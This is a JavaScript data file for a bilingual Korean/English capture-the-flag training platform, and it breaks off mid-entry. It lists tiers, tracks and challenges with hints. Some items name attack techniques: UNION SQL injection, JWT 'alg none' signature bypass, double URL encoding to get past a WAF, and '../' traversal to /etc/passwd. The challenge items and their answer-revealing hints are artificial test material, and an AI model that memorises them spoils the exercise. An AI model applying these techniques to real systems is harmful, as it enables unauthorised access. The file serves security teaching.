// AUTO-GENERATED. Flags stored as SHA-256 only (no plaintext).
const TIERS = [
  {
    "id": 0,
    "ko": "입문",
    "en": "Onboarding",
    "need": 4,
    "desc_ko": "브라우저 개발자 도구와 기본 인코딩에 익숙해지기.",
    "desc_en": "Get comfortable with browser devtools and basic encoding."
  },
  {
    "id": 1,
    "ko": "기초",
    "en": "Beginner",
    "need": 6,
    "desc_ko": "고전 암호·웹 기초·HTTP 지식.",
    "desc_en": "Classic ciphers, web basics, HTTP knowledge."
  },
  {
    "id": 2,
    "ko": "중급",
    "en": "Intermediate",
    "need": 9,
    "desc_ko": "인젝션·해시·JWT·인코딩·간단한 리버싱.",
    "desc_en": "Injection, hashing, JWT, encoding, light reversing."
  },
  {
    "id": 3,
    "ko": "고급",
    "en": "Advanced",
    "need": 7,
    "desc_ko": "XOR/ROT47 암호·익스플로잇·포렌식·탐지.",
    "desc_en": "XOR/ROT47 crypto, exploitation, forensics, detection."
  },
  {
    "id": 4,
    "ko": "전문가",
    "en": "Expert",
    "need": 5,
    "desc_ko": "체인 디코딩·클라우드·암호 운영모드·AI 보안 종합.",
    "desc_en": "Chained decoding, cloud, crypto modes, AI security capstone."
  }
];

const TRACKS = [
  {
    "id": "web",
    "icon": "🌐",
    "ko": "웹 해킹",
    "en": "Web & App",
    "desc_ko": "소스 분석·세션·인젝션·SSTI 등 웹 공격면.",
    "desc_en": "Source review, sessions, injection, SSTI."
  },
  {
    "id": "crypto",
    "icon": "🔐",
    "ko": "암호·인코딩",
    "en": "Crypto & Encoding",
    "desc_ko": "고전 암호·인코딩·해시·현대 암호 운영모드.",
    "desc_en": "Classic ciphers, encoding, hashing, modern modes."
  },
  {
    "id": "system",
    "icon": "💻",
    "ko": "시스템·리버싱·Pwn",
    "en": "System, Reversing & Pwn",
    "desc_ko": "리눅스·윈도우/AD·리버싱·바이너리 익스플로잇.",
    "desc_en": "Linux, Windows/AD, reversing, binary exploitation."
  },
  {
    "id": "forensics",
    "icon": "🔍",
    "ko": "포렌식·멀웨어·네트워크",
    "en": "Forensics, Malware & Network",
    "desc_ko": "파일 시그니처·메타데이터·탐지·패킷 분석.",
    "desc_en": "File signatures, metadata, detection, packets."
  },
  {
    "id": "cloud",
    "icon": "☁️",
    "ko": "클라우드·AI",
    "en": "Cloud, Container & AI",
    "desc_ko": "컨테이너/쿠버네티스·클라우드 메타데이터·LLM 보안.",
    "desc_en": "Containers/K8s, cloud metadata, LLM security."
  }
,
  {
    "id": "ai",
    "icon": "🤖",
    "ko": "AI·LLM 보안",
    "en": "AI & LLM Security",
    "desc_ko": "프롬프트 인젝션·적대적 예제·모델 복제·도구 호출 권한.",
    "desc_en": "Prompt injection, adversarial examples, model copying, tool-calling privilege."
  },
  {
    "id": "network",
    "icon": "🛰️",
    "ko": "네트워크·프로토콜",
    "en": "Network & Protocols",
    "desc_ko": "TCP/IP·DNS·TLS·무선·라우팅과 그 위에서 벌어지는 공격과 방어.",
    "desc_en": "TCP/IP, DNS, TLS, wireless and routing — and the attacks and defenses on top of them."
  }
,
{
    "id": "mobile",
    "icon": "📱",
    "ko": "모바일 보안",
    "en": "Mobile Security",
    "desc_ko": "안드로이드·iOS 앱 분석과 후킹, 기기 아티팩트와 물리 추출.",
    "desc_en": "Android and iOS app analysis and hooking, device artifacts and physical extraction."
  },
  {
    "id": "hardware",
    "icon": "🔌",
    "ko": "하드웨어·IoT",
    "en": "Hardware & IoT",
    "desc_ko": "직렬 버스·펌웨어·무선 프로토콜과 산업 제어 시스템.",
    "desc_en": "Serial buses, firmware, wireless protocols and industrial control systems."
  },
  {
    "id": "blueteam",
    "icon": "🛡️",
    "ko": "블루팀 탐지·대응",
    "en": "Blue Team & Detection",
    "desc_ko": "로그 수집·탐지 룰·사고 대응과 위협 인텔리전스.",
    "desc_en": "Log collection, detection rules, incident response and threat intelligence."
  },
  {
    "id": "physical",
    "icon": "🚪",
    "ko": "물리 보안 침투",
    "en": "Physical Security",
    "desc_ko": "출입 통제·잠금장치·RFID 배지·물리 정찰과 사회공학.",
    "desc_en": "Access control, locks, RFID badges, physical recon and social engineering."
  },
  {
    "id": "automotive",
    "icon": "🚗",
    "ko": "자동차 해킹",
    "en": "Automotive",
    "desc_ko": "CAN 버스·OBD-II·UDS 진단·ECU·텔레매틱스와 V2X.",
    "desc_en": "CAN bus, OBD-II, UDS diagnostics, ECUs, telematics and V2X."
  },
  {
    "id": "zerotrust",
    "icon": "🛂",
    "ko": "제로 트러스트",
    "en": "Zero Trust",
    "desc_ko": "신원·기기 검증·마이크로세그멘테이션·ZTNA·정책 엔진.",
    "desc_en": "Identity and device verification, microsegmentation, ZTNA, policy engines."
  },
  {
    "id": "web3",
    "icon": "⛓️",
    "ko": "블록체인·Web3",
    "en": "Blockchain & Web3",
    "desc_ko": "EVM 내부·스마트 컨트랙트 취약점·DeFi 공격·온체인 포렌식.",
    "desc_en": "EVM internals, smart contract bugs, DeFi attacks, on-chain forensics."
  },
  {
    "id": "adattack",
    "icon": "🎫",
    "ko": "액티브 디렉터리 공격",
    "en": "Active Directory",
    "desc_ko": "Kerberos 티켓 공격·자격 증명 탈취·횡이동·도메인 지속성·공격 그래프 분석.",
    "desc_en": "Kerberos ticket attacks, credential theft, lateral movement, domain persistence, attack-graph analysis."
  },
  {
    "id": "revadv",
    "icon": "🔬",
    "ko": "리버싱 심화",
    "en": "Advanced Reversing",
    "desc_ko": "안티디버깅 우회·언패킹과 난독화 해제·심볼릭 실행·바이너리 분석과 패치 디핑.",
    "desc_en": "Bypassing anti-debug, unpacking and deobfuscation, symbolic execution, binary analysis and patch diffing."
  }
];

const CHALLENGES = [
  {
    "id": "t0_source",
    "tier": 0,
    "cat": "web",
    "track": "web",
    "points": 50,
    "ci": false,
    "hash": "c5c8705bc1be2d75c0e25081c9a52ab81f90b50ad8ee73e38467740f9a844fc9",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "소스를 보라",
      "en": "View the Source"
    },
    "prompt": {
      "ko": "이 페이지의 HTML 소스 어딘가에 플래그가 주석으로 숨겨져 있습니다. 페이지 소스 보기(Ctrl+U) 또는 개발자도구로 찾으세요.",
      "en": "A flag is hidden in this page's HTML source as a comment. Use View Source (Ctrl+U) or DevTools."
    },
    "hints": {
      "ko": [
        "브라우저에서 Ctrl+U 를 눌러 보세요.",
        "HTML 주석은 <!-- 로 시작합니다."
      ],
      "en": [
        "Press Ctrl+U in your browser.",
        "HTML comments start with <!--."
      ]
    }
  },
  {
    "id": "t0_base64",
    "tier": 0,
    "cat": "crypto",
    "track": "crypto",
    "points": 50,
    "ci": false,
    "hash": "e522e8e38fdb6db3a667432087916a6abe7deb7400e3d58e92e1470cb3b1e054",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "비밀의 문자열",
      "en": "Secret String"
    },
    "prompt": {
      "ko": "다음 문자열을 디코딩하면 플래그가 됩니다:\n\n`RkxBR3tiYXNlNjRfaXNfZW5jb2Rpbmd9`",
      "en": "Decode this string to reveal the flag:\n\n`RkxBR3tiYXNlNjRfaXNfZW5jb2Rpbmd9`"
    },
    "hints": {
      "ko": [
        "= 로 끝나는 문자열은 보통 Base64입니다.",
        "터미널: `echo '...' | base64 -d` 또는 브라우저 콘솔: `atob('...')`"
      ],
      "en": [
        "Strings ending with = are often Base64.",
        "Try `echo '...' | base64 -d` or in the console: `atob('...')`"
      ]
    }
  },
  {
    "id": "t0_devtools",
    "tier": 0,
    "cat": "web",
    "track": "web",
    "points": 60,
    "ci": false,
    "hash": "66ecc396caa1aca3a50d4dabc2703a01bc89e2acf9e3725bb11b16d8e8ddaf81",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "콘솔의 비밀",
      "en": "Console Secret"
    },
    "prompt": {
      "ko": "개발자도구(F12) 콘솔을 열고 `window.__hint` 전역 변수를 출력해 보세요.",
      "en": "Open DevTools (F12), go to the Console, and print the global variable `window.__hint`."
    },
    "hints": {
      "ko": [
        "F12 → Console 탭.",
        "콘솔에 `window.__hint` 를 입력하고 Enter."
      ],
      "en": [
        "F12 -> Console tab.",
        "Type `window.__hint` and press Enter."
      ]
    }
  },
  {
    "id": "t0_ls",
    "tier": 0,
    "cat": "linux",
    "track": "system",
    "points": 40,
    "ci": true,
    "hash": "1de700c29687cae34561545f50d3c8b3d9afe88e04cc11069f8a6dc6e4ce9464",
    "fmt": "명령어 / command",
    "title": {
      "ko": "모든 것을 보여줘",
      "en": "Show Me Everything"
    },
    "prompt": {
      "ko": "리눅스에서 숨김 파일을 포함해 현재 디렉터리의 모든 파일을 권한·소유자와 함께 자세히 나열하는 명령은? (명령어만, 예: `cmd -opt`)",
      "en": "Which Linux command lists all files in the current directory in long format, including hidden files? (command only, e.g. `cmd -opt`)"
    },
    "hints": {
      "ko": [
        "`ls` 명령의 옵션 두 개를 조합합니다.",
        "`-l`(자세히)과 `-a`(숨김 포함)."
      ],
      "en": [
        "Combine two options of `ls`.",
        "`-l` (long) and `-a` (all/hidden)."
      ]
    }
  },
  {
    "id": "t0_binary",
    "tier": 0,
    "cat": "crypto",
    "track": "crypto",
    "points": 50,
    "ci": true,
    "hash": "e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "0과 1의 언어",
      "en": "Language of 0s and 1s"
    },
    "prompt": {
      "ko": "다음 이진수(8비트씩)를 ASCII 텍스트로 디코딩하세요:\n\n`01101000 01100001 01100011 01101011 01100101 01110010`",
      "en": "Decode this binary (8 bits each) into ASCII text:\n\n`01101000 01100001 01100011 01101011 01100101 01110010`"
    },
    "hints": {
      "ko": [
        "8자리마다 한 글자입니다.",
        "01001000 = 0x48 = 'H'."
      ],
      "en": [
        "Each 8 digits is one character.",
        "01001000 = 0x48 = 'H'."
      ]
    }
  },
  {
    "id": "t0_title",
    "tier": 0,
    "cat": "web",
    "track": "web",
    "points": 40,
    "ci": true,
    "hash": "41619bedb010a070affe3cba11e586db3c73043f09b6a616f77fcb03f84d8e43",
    "fmt": "제목 / title",
    "title": {
      "ko": "탭의 제목",
      "en": "The Tab Title"
    },
    "prompt": {
      "ko": "브라우저 탭(또는 HTML `<title>` 태그)에 표시되는 이 페이지의 제목은 무엇인가요? (정확히 입력)",
      "en": "What is this page's title shown in the browser tab (the HTML `<title>` tag)? (exact)"
    },
    "hints": {
      "ko": [
        "브라우저 탭 위쪽을 보세요.",
        "소스의 `<title>...</title>` 안."
      ],
      "en": [
        "Look at the top of the browser tab.",
        "Inside `<title>...</title>` in the source."
      ]
    }
  },
  {
    "id": "t1_rot13",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 70,
    "ci": false,
    "hash": "26b345b8a42722db6e8d75a2aba4ad401924477eb7934287b4efc47cfd07ea8b",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "13칸의 마법",
      "en": "Thirteen Steps"
    },
    "prompt": {
      "ko": "다음은 알파벳을 13칸 민 결과입니다. 원문을 구하세요:\n\n`SYNT{ebg13_pnrfne_pbhfva}`",
      "en": "The following was shifted by 13 letters. Recover the original:\n\n`SYNT{ebg13_pnrfne_pbhfva}`"
    },
    "hints": {
      "ko": [
        "ROT13 입니다. 한 번 더 ROT13 하면 원문.",
        "`tr 'A-Za-z' 'N-ZA-Mn-za-m'` 또는 온라인 ROT13."
      ],
      "en": [
        "It's ROT13. Applying ROT13 again restores it.",
        "Use `tr 'A-Za-z' 'N-ZA-Mn-za-m'` or an online ROT13."
      ]
    }
  },
  {
    "id": "t1_hex",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 70,
    "ci": false,
    "hash": "047ca2f904ff08b38c24c5a77da663b2c7f52e3457a47e97a4337b32e75c48db",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "16진수의 세계",
      "en": "Hex World"
    },
    "prompt": {
      "ko": "16진수로 인코딩된 플래그입니다. 디코딩하세요:\n\n`464c41477b6865785f69735f6261736531367d`",
      "en": "A hex-encoded flag. Decode it:\n\n`464c41477b6865785f69735f6261736531367d`"
    },
    "hints": {
      "ko": [
        "두 자리씩 한 바이트입니다.",
        "브라우저 콘솔에서 두 자리씩 잘라 `parseInt(b, 16)` 로 파싱해 보세요."
      ],
      "en": [
        "Every two digits is one byte.",
        "In the console, slice it two digits at a time and `parseInt(b, 16)`."
      ]
    }
  },
  {
    "id": "t1_railfence",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 70,
    "ci": true,
    "hash": "b6396bef6dbcaa4651dc4241ae88196d1e00dbd4a29cb8aad49c2941541fae4e",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "지그재그 울타리",
      "en": "The Zig-Zag Fence"
    },
    "prompt": {
      "ko": "메시지를 여러 행에 지그재그(위아래)로 적은 뒤 행 단위로 이어 읽는 고전 전치(transposition) 암호의 이름은? (영문 두 단어)",
      "en": "What classic transposition cipher writes the message in a zig-zag across several rows, then reads it off row by row? (two English words)"
    },
    "hints": {
      "ko": [
        "지그재그 울타리 모양에서 이름을 딴 전치 암호입니다.",
        "`rail ____` — 두 번째 단어는 '울타리/장벽'을 뜻합니다."
      ],
      "en": [
        "A transposition cipher named for its zig-zag, fence-like shape.",
        "`rail ____` — the second word means a barrier/enclosure."
      ]
    }
  },
  {
    "id": "t1_cookie",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 70,
    "ci": false,
    "hash": "e0b7c03a863b596a51608cc06f09a60618cfc61d2e9372ff03a4fc5133cb60ea",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "쿠키 몬스터",
      "en": "Cookie Monster"
    },
    "prompt": {
      "ko": "이 사이트가 당신의 브라우저에 쿠키를 하나 구워뒀습니다. 개발자도구 Application(Storage) → Cookies 또는 콘솔의 `document.cookie` 로 확인하세요.",
      "en": "This site baked a cookie into your browser. Check DevTools Application -> Cookies, or `document.cookie` in the console."
    },
    "hints": {
      "ko": [
        "콘솔에 `document.cookie` 입력.",
        "`wg_flag` 라는 이름의 쿠키를 찾으세요."
      ],
      "en": [
        "Type `document.cookie` in the console.",
        "Look for a cookie named `wg_flag`."
      ]
    }
  },
  {
    "id": "t1_teapot",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 60,
    "ci": true,
    "hash": "4c8d5b6c695d265fb63dd73f275a21043a5887b37cb4fea0552ecc7b417c8f88",
    "fmt": "숫자 / number",
    "title": {
      "ko": "나는 주전자",
      "en": "I'm a Teapot"
    },
    "prompt": {
      "ko": "HTTP 상태 코드 중 \"I'm a teapot\"(나는 찻주전자다)에 해당하는 숫자는? (숫자만)",
      "en": "Which HTTP status code corresponds to \"I'm a teapot\"? (number only)"
    },
    "hints": {
      "ko": [
        "RFC 2324, 만우절 농담에서 유래한 4xx 코드.",
        "4로 시작하는 세 자리."
      ],
      "en": [
        "RFC 2324, an April Fools' joke 4xx code.",
        "Three digits, starts with 4."
      ]
    }
  },
  {
    "id": "t1_css",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 70,
    "ci": false,
    "hash": "c79ba81d3c97cd4663bdca70adfc48d9814ba5e9d7aa381907aaf6e6a32bc8ff",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "보이지 않는 것",
      "en": "The Invisible"
    },
    "prompt": {
      "ko": "화면에는 안 보이지만 DOM에는 존재하는 요소가 있습니다. `display:none` 이라고 안전한 건 아니죠. 페이지에서 숨겨진 요소를 찾으세요.",
      "en": "Something is in the DOM but not visible on screen. `display:none` doesn't mean safe. Find the hidden element."
    },
    "hints": {
      "ko": [
        "개발자도구 Elements 에서 id=`ghost` 요소를 찾으세요.",
        "Ctrl+F 로 'FLAG' 검색."
      ],
      "en": [
        "In DevTools Elements, find the element with id=`ghost`.",
        "Ctrl+F for 'FLAG'."
      ]
    }
  },
  {
    "id": "t1_caesar",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 70,
    "ci": false,
    "hash": "c3514a33998970b1f29cb055f594b73ea43624abe7143bc3eaee49366d94250c",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "카이사르의 암호",
      "en": "Caesar's Cipher"
    },
    "prompt": {
      "ko": "율리우스 카이사르가 쓰던 방식으로 각 글자를 3칸 밀었습니다. 원문을 복원하세요:\n\n`IODJ{fdhvdu_vkliw_wkuhh}`",
      "en": "Each letter was shifted by 3, as Julius Caesar did. Recover the original:\n\n`IODJ{fdhvdu_vkliw_wkuhh}`"
    },
    "hints": {
      "ko": [
        "반대로 3칸 당기면 됩니다.",
        "ROT13과 같은 원리, 이동량만 3."
      ],
      "en": [
        "Shift back by 3.",
        "Same idea as ROT13, but a shift of 3."
      ]
    }
  },
  {
    "id": "t1_morse",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 60,
    "ci": true,
    "hash": "c0946106b732f9f6ae889101ab987ed1bbcfe3eda2ad0a971be31575ad676851",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "점과 선",
      "en": "Dots and Dashes"
    },
    "prompt": {
      "ko": "다음 모스 부호를 해독하세요 (공백은 글자 구분):\n\n`... --- ...`",
      "en": "Decode this Morse code (spaces separate letters):\n\n`... --- ...`"
    },
    "hints": {
      "ko": [
        "... 는 S, --- 는 O 입니다.",
        "가장 유명한 구조 신호."
      ],
      "en": [
        "... is S, --- is O.",
        "The most famous distress signal."
      ]
    }
  },
  {
    "id": "t1_robots",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 60,
    "ci": true,
    "hash": "870b1fc137c2af20441f74a26febf99739d79cee1246063e279ca05f288e943c",
    "fmt": "파일 이름 / file name",
    "title": {
      "ko": "크롤러에게 보내는 쪽지",
      "en": "Note to Crawlers"
    },
    "prompt": {
      "ko": "웹사이트가 검색엔진 크롤러에게 접근 규칙을 알려줄 때 루트에 두는 표준 파일의 이름은? (확장자 포함)",
      "en": "What standard file does a website place at its root to tell search crawlers the access rules? (with extension)"
    },
    "hints": {
      "ko": [
        "펜테스트 정찰 때도 가장 먼저 확인합니다.",
        "`/______.txt`"
      ],
      "en": [
        "Recon's first stop in a pentest, too.",
        "`/______.txt`"
      ]
    }
  },
  {
    "id": "t2_union",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 90,
    "ci": true,
    "hash": "e1023fc6a5fa259e278448b65d01cad04eebb01fc0b420c5def2a7d7900c15fd",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "다른 테이블을 합쳐라",
      "en": "Join Another Table"
    },
    "prompt": {
      "ko": "SQL 인젝션에서 다른 테이블의 데이터를 기존 쿼리 결과에 결합해 추출할 때 쓰는 두 단어 키워드는? (영문)",
      "en": "In SQL injection, which two-word keyword combines another table's data into the original query result? (English)"
    },
    "hints": {
      "ko": [
        "컬럼 수가 같아야 동작합니다.",
        "`UNION ...`"
      ],
      "en": [
        "Column counts must match.",
        "`UNION ...`"
      ]
    }
  },
  {
    "id": "t2_md5",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 90,
    "ci": true,
    "hash": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "가장 흔한 비밀번호",
      "en": "The Most Common One"
    },
    "prompt": {
      "ko": "MD5 해시 `5f4dcc3b5aa765d61d8327deb882cf99` 의 평문은? (아주 유명한 단어)",
      "en": "What is the plaintext of the MD5 hash `5f4dcc3b5aa765d61d8327deb882cf99`? (a very famous word)"
    },
    "hints": {
      "ko": [
        "레인보우 테이블/구글에 해시를 검색해 보세요.",
        "가장 흔한 비밀번호 중 하나입니다."
      ],
      "en": [
        "Search the hash in a rainbow table / Google.",
        "It's one of the most common passwords."
      ]
    }
  },
  {
    "id": "t2_jwt",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 90,
    "ci": true,
    "hash": "140bedbf9c3f6d56a9846d2ba7088798683f4da0c248231336e6a05679e4fdfe",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "서명을 무력화하라",
      "en": "Defeat the Signature"
    },
    "prompt": {
      "ko": "JWT에서 `alg` 헤더를 무엇으로 바꾸면 서명 검증을 우회할 수 있나요? (소문자 한 단어)",
      "en": "Setting the JWT `alg` header to which value can bypass signature verification? (one lowercase word)"
    },
    "hints": {
      "ko": [
        "'알고리즘 없음'을 의미합니다.",
        "`{\"alg\":\"____\"}`"
      ],
      "en": [
        "It means 'no algorithm'.",
        "`{\"alg\":\"____\"}`"
      ]
    }
  },
  {
    "id": "t2_reverse",
    "tier": 2,
    "cat": "reversing",
    "track": "system",
    "points": 100,
    "ci": false,
    "hash": "a5fc290ac7280cc55af945e695d8d2aedfbf2bc649f0eec9b5ba857b30f83e74",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "거꾸로 그리고 인코딩",
      "en": "Reverse then Encode"
    },
    "prompt": {
      "ko": "어떤 플래그를 문자열 뒤집기 후 Base64 인코딩했더니 아래가 나왔습니다. 원래 플래그는?\n\n`fTQ2Yl9uZWh0X2VzcmV2ZXJ7R0FMRg==`\n\n변환: `btoa(flag.split('').reverse().join(''))`",
      "en": "A flag was reversed then Base64-encoded into the value below. What was the original flag?\n\n`fTQ2Yl9uZWh0X2VzcmV2ZXJ7R0FMRg==`\n\nTransform: `btoa(flag.split('').reverse().join(''))`"
    },
    "hints": {
      "ko": [
        "먼저 Base64 디코드: `atob('...')`.",
        "그 결과를 다시 뒤집으세요."
      ],
      "en": [
        "First Base64-decode: `atob('...')`.",
        "Then reverse the result."
      ]
    }
  },
  {
    "id": "t2_url",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 80,
    "ci": true,
    "hash": "f1d8d5da9b6d11e01b22c1aa927e6e5cc7f23339adda6b39764d7d6fe9fca84e",
    "fmt": "값 그대로 / literal",
    "title": {
      "ko": "이중 인코딩",
      "en": "Double Encoding"
    },
    "prompt": {
      "ko": "WAF 우회에 자주 쓰이는 이중 URL 인코딩입니다. `%2553` 을 한 번만 URL 디코딩하면 무엇이 되나요? (그대로 입력)",
      "en": "Double URL encoding is common for WAF bypass. What does `%2553` become after decoding URL-encoding once? (enter as-is)"
    },
    "hints": {
      "ko": [
        "`%25` 는 `%` 문자입니다.",
        "`%25` + `53` → ?"
      ],
      "en": [
        "`%25` decodes to `%`.",
        "`%25` + `53` -> ?"
      ]
    }
  },
  {
    "id": "t2_xss",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 80,
    "ci": true,
    "hash": "33d8ce420e65b03cd89a4de87decd82e0c0358e10e96a31738ee16f0c41059b6",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "쿠키를 지켜라",
      "en": "Protect the Cookie"
    },
    "prompt": {
      "ko": "XSS로 자바스크립트가 쿠키(document.cookie)를 읽지 못하게 막는 쿠키 속성은? (한 단어)",
      "en": "Which cookie attribute prevents JavaScript (document.cookie) from reading a cookie during XSS? (one word)"
    },
    "hints": {
      "ko": [
        "쿠키 설정의 플래그입니다.",
        "`Set-Cookie: ...; ________`"
      ],
      "en": [
        "A flag in the cookie setting.",
        "`Set-Cookie: ...; ________`"
      ]
    }
  },
  {
    "id": "t2_lfi",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 90,
    "ci": false,
    "hash": "fa08499e14d0113ba6794623f1badedcc8e9ae51cb5bafc7e14a5af1454bcfe7",
    "fmt": "경로 표기 / path notation (3글자 / 3 chars)",
    "title": {
      "ko": "상위로 올라가기",
      "en": "Climb Up"
    },
    "prompt": {
      "ko": "경로 순회(Path Traversal/LFI)에서 상위 디렉터리로 한 단계 올라갈 때 쓰는 세 글자 시퀀스는?",
      "en": "In path traversal (LFI), what three-character sequence moves up one directory level?"
    },
    "hints": {
      "ko": [
        "`/etc/passwd` 를 읽으려면 여러 번 반복합니다.",
        "점 두 개와 슬래시."
      ],
      "en": [
        "Repeated many times to reach `/etc/passwd`.",
        "Two dots and a slash."
      ]
    }
  },
  {
    "id": "t2_b32",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 100,
    "ci": false,
    "hash": "e56dd9eb62ba3233649372c53139b1564e508f2c8189a9e62e3d223fff2f40d0",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "32진법 인코딩",
      "en": "Base32 Encoding"
    },
    "prompt": {
      "ko": "대문자와 숫자 2-7만 쓰는 인코딩입니다. 디코딩하세요:\n\n`IZGECR33MJQXGZJTGJPXK43FONPXEZTDGQ3DIOD5`",
      "en": "An encoding that uses only uppercase letters and digits 2-7. Decode it:\n\n`IZGECR33MJQXGZJTGJPXK43FONPXEZTDGQ3DIOD5`"
    },
    "hints": {
      "ko": [
        "= 패딩이 있지만 Base64는 아닙니다 — Base32.",
        "`echo '...' | base32 -d`"
      ],
      "en": [
        "Has = padding but isn't Base64 — it's Base32.",
        "`echo '...' | base32 -d`"
      ]
    }
  },
  {
    "id": "t2_sha1",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 90,
    "ci": true,
    "hash": "b1565820a5cdac40e0520d23f9d0b1497f240ddc51d72eac6423d97d952d444f",
    "fmt": "알고리즘 이름 / algorithm name (4글자 / 4 chars, 하이픈 없이 / no hyphen)",
    "title": {
      "ko": "해시의 정체",
      "en": "Identify the Hash"
    },
    "prompt": {
      "ko": "40자리 16진수(160비트)로 출력되며, 충돌 공격이 발견되어 사용이 권장되지 않는 해시 알고리즘은? (이름을 하이픈 없이 붙여서 입력)",
      "en": "Which hash algorithm outputs 40 hex chars (160-bit) and is deprecated due to collision attacks? (write the name as one token, without a hyphen)"
    },
    "hints": {
      "ko": [
        "MD5(32자리)보다 길고 SHA-256(64자리)보다 짧습니다.",
        "Git이 오래 쓰던 그 해시."
      ],
      "en": [
        "Longer than MD5 (32) and shorter than SHA-256 (64).",
        "The hash Git used for years."
      ]
    }
  },
  {
    "id": "t2_rsa",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 100,
    "ci": true,
    "hash": "f5f69168bba3cfa1e2a80dff839b48db36df36fa876c1cd9d7d508f3ab308744",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "두 소수의 곱",
      "en": "Product of Two Primes"
    },
    "prompt": {
      "ko": "두 큰 소수의 곱을 인수분해하기 어렵다는 점에 안전성을 두는, 공개키/개인키 쌍을 사용하는 대표적 비대칭 암호 알고리즘의 약자는?",
      "en": "Which asymmetric algorithm — using a public/private key pair — bases its security on the difficulty of factoring the product of two large primes? (abbreviation)"
    },
    "hints": {
      "ko": [
        "발명자 세 사람 Rivest·Shamir·Adleman의 이니셜입니다.",
        "TLS·SSH·PGP에서 오래 쓰인 3글자 약자."
      ],
      "en": [
        "The initials of its inventors Rivest, Shamir, Adleman.",
        "A 3-letter abbreviation long used in TLS, SSH, PGP."
      ]
    }
  },
  {
    "id": "t2_polybius",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 90,
    "ci": true,
    "hash": "7d0d4704202c5ab87ab3ac01cdc9503b9b26a0fec933808f18e64e79e9d13992",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "5×5 좌표 암호",
      "en": "The 5×5 Grid Cipher"
    },
    "prompt": {
      "ko": "각 알파벳을 5×5 격자에서의 (행, 열) 좌표 숫자쌍으로 바꾸는 고전 암호(I/J는 한 칸을 공유)의 이름은? (영문 한 단어)",
      "en": "Which classic cipher replaces each letter with its (row, column) coordinate pair in a 5×5 grid (I and J share a cell)? (one English word)"
    },
    "hints": {
      "ko": [
        "고대 그리스 역사가의 이름에서 왔습니다.",
        "`poly____` — '정사각형(square)'과 함께 불리기도 합니다."
      ],
      "en": [
        "Named after an ancient Greek historian.",
        "`poly____` — often paired with the word 'square'."
      ]
    }
  },
  {
    "id": "t3_xor",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 130,
    "ci": false,
    "hash": "1923dcadd8af7b2f13a42f6c77e17d6d7d537f402457a78423006f2316637ae8",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "단일 바이트 XOR",
      "en": "Single-Byte XOR"
    },
    "prompt": {
      "ko": "아래 16진 바이트열은 어떤 플래그를 단일 바이트 키 `0x42` 로 XOR한 결과입니다. 복호화하세요:\n\n`040e030539312b2c252e271d203b36271d3a2d301d76703f`",
      "en": "The hex bytes below are a flag XOR-ed with the single-byte key `0x42`. Decrypt it:\n\n`040e030539312b2c252e271d203b36271d3a2d301d76703f`"
    },
    "hints": {
      "ko": [
        "각 바이트를 0x42 와 XOR 하세요.",
        "Python: `bytes.fromhex(h)` 후 `b ^ 0x42`."
      ],
      "en": [
        "XOR each byte with 0x42.",
        "Python: `bytes.fromhex(h)` then `b ^ 0x42`."
      ]
    }
  },
  {
    "id": "t3_kerb",
    "tier": 3,
    "cat": "windows",
    "track": "system",
    "points": 110,
    "ci": true,
    "hash": "f596dc40b19f77eede697e09e6b240defb8a9fa20976531511fc3df92030b772",
    "fmt": "숫자 / number",
    "title": {
      "ko": "케르베로스의 흔적",
      "en": "Trace of Kerberos"
    },
    "prompt": {
      "ko": "서비스 계정 티켓을 오프라인으로 크래킹하려는 정찰을 탐지하는 핵심 신호다. 취약한 RC4 로 암호화된 서비스 티켓(TGS) 요청을 나타내는 Windows 보안 이벤트 ID는? (숫자)",
      "en": "The key signal for spotting reconnaissance that aims to crack service-account tickets offline: which Windows Security Event ID marks a service-ticket (TGS) request encrypted with the weak RC4 cipher? (number)"
    },
    "hints": {
      "ko": [
        "TGS 티켓 요청 이벤트입니다.",
        "47 로 시작하는 네 자리."
      ],
      "en": [
        "A TGS ticket request event.",
        "Four digits starting with 47."
      ]
    }
  },
  {
    "id": "t3_fmt",
    "tier": 3,
    "cat": "pwn",
    "track": "system",
    "points": 120,
    "ci": true,
